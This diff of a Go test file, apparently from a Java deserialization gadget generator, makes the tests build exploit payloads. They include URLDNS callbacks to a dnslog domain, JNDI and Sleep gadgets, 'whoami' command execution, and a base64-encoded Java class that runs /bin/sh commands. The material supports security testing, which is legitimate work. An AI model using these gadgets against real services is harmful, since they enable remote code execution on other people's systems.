@@ -10,9 +10,9 @@ import (
 )
 
 func TestGenerateGadgetByGadgetName(t *testing.T) {
-	gadget, err := GenerateGadget("URLDNS", SetGadgetParam(map[string]string{
-		"domain": "rahtkbblhv.dgrh3.cn",
-	}))
+	gadget, err := GenerateGadget("BeanShell1", "script_base64", map[string]string{
+		"script": "yv66vgAAADQAXgkAMwA0CAA1CgAEADYHADcIADgIADkJABsAOggAHQgAOwoAPAA9CgA8AD4HAD8KAAwAQAoAHABBCQAbAEIIAEMKABsARAgARQgAHwkAGwBGCABHCQAbAEgHAEkKABcAQQoAFwBKCgAXAEsHAEwHAE0BAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAhpc1N0YXRpYwEAA3llcwEABGZsYWcBAAVzdGFydAEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwBOBwA/AQAGPGluaXQ+BwBMAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcATwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABBSdW50aW1lRXhlYy5qYXZhBwBQDABRAB4BAAEvDABSAFMBABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jDAAdAB4BAAIvQwcAVAwAVQBWDABXAFgBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABZACMMACkAIwwAIQAeAQALaXNTdGF0aWNZZXMMACIAIwEAAmlkDAAfAB4BAANZZXMMACAAHgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABaAFsMAFwAXQEACENuSmlqU3ZwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE1tMamF2YS9sYW5nL1N0cmluZzsBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAbABwAAAAEAAoAHQAeAAAACgAfAB4AAAAKACAAHgAAAAoAIQAeAAAABQAJACIAIwABACQAAACZAAQAAgAAAEmyAAESArYAA5kAGwa9AARZAxIFU1kEEgZTWQWyAAdTS6cAGAa9AARZAxIIU1kEEglTWQWyAAdTS7gACiq2AAtXpwAITCu2AA2xAAEAOABAAEMADAACACUAAAAiAAgAAAAWAAsAFwAjABkAOAAdAEAAIABDAB4ARAAfAEgAIQAmAAAADgAEI/wAFAcAJ0oHACgEAAEAKQAjAAEAJAAAAEkAAgABAAAAEyq3AA6yAA8SELYAA5oABrgAEbEAAAACACUAAAASAAQAAAAnAAQAKAAPACkAEgAqACYAAAAMAAH/ABIAAQcAKgAAAAEAKwAsAAIAJAAAABkAAAADAAAAAbEAAAABACUAAAAGAAEAAAAtAC0AAAAEAAEALgABACsALwACACQAAAAZAAAABAAAAAGxAAAAAQAlAAAABgABAAAAMAAtAAAABAABAC4ACAAwACMAAQAkAAAAcAACAAAAAAA3EhKzAAcSE7MAFBIVswAWuwAXWbcAGLIAFLYAGbIAFrYAGbYAGrMAD7IADxIQtgADmQAGuAARsQAAAAIAJQAAAB4ABwAAABAABQARAAoAEgAPACMAKAAkADMAJQA2ACYAJgAAAAMAATYAAQAxAAAAAgAy",
+	})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -29,27 +29,67 @@ func TestGenerateGadget(t *testing.T) {
 	}
 	for name, gadget := range YsoConfigInstance.Gadgets {
 		if gadget.IsTemplateImpl {
-			_, err = GenerateGadget(name, SetRuntimeExecEvilClass("whoami"))
+			_, err = GenerateGadget(string(name), "RuntimeExec", "whoami")
 			if err != nil {
 				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
 			}
 		} else if gadget.Template == nil {
-			gadget, err := GenerateGadget(name, SetTransformChainType("raw_cmd", "whoami"))
+			gadget, err := GenerateGadget(string(name), "raw_cmd", "whoami")
 			if err != nil {
 				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
 			}
 			_ = gadget
 		} else {
-			_, err = GenerateGadget(name, SetGadgetParam(map[string]string{
+			_, err = GenerateGadget(string(name), YsoConfigInstance.Gadgets[name].ReferenceFun, map[string]string{
 				"class":  "aaa",
 				"domain": "aaa",
 				"jndi":   "aa",
-			}))
+			})
 			if err != nil {
 				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
 			}
 		}
 	}
+}
+func TestGenerateGadgetFunc(t *testing.T) {
+	_, err := GenerateGadget("URLDNS", "dnslog", "rahtkbblhv.dgrh3.cn")
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = GenerateGadget("URLDNS", "dnslog", map[string]string{
+		"domain": "rahtkbblhv.dgrh3.cn",
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	_, err = GenerateGadget("CommonsCollections2", "Sleep", "1000")
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = GenerateGadget("CommonsCollections2", "Sleep", map[string]string{
+		"time": "1000",
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	_, err = GenerateGadget("CommonsCollections1", "jndi", "xxx.com")
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = GenerateGadget("CommonsCollections1", "jndi", map[string]string{
+		"jndi": "xxx.com",
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	_, err = GenerateGadget("SimplePrincipalCollection")
+	if err != nil {
+		t.Fatal(err)
+	}
+
 }
 func TestMUSTPASSSetMajorVersion(t *testing.T) {
 	type testCase struct {
